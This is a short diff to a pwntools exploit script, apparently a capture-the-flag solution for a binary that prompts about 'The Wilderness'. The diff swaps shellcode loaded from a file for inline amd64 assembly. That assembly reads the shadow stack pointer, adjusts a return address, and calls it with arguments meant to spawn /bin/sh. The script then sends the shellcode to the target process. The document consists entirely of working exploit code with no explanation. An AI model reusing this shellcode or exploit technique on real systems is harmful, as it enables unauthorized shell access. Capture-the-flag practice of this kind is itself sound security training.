@@ -50,8 +50,21 @@ continue
 
 io = start()
 
-with open("./test/shellcode.bin", "rb") as f:
-    shellcode = f.read()
+shellcode = asm('''
+    endbr64;
+    rdsspq rsp;
+    mov rax, [rsp];
+    sub ax, 5475;
+    add ax, 0x126f;
+    mov dil, 0x3b;
+    mov esi, 0xdead01f;
+    call rax;
+''', arch = 'amd64', os = 'linux', bits = 64)
+
+shellcode += b"/bin/sh"
+
+# with open("./shellcode/shellcode.bin", "rb") as f:
+#     shellcode = f.read()
 
 io.sendlineafter(b"How many bytes do you want to write in The Wilderness?", str(len(shellcode)).encode())
 io.sendafter(b"What do you want to do in The Wilderness?", shellcode)
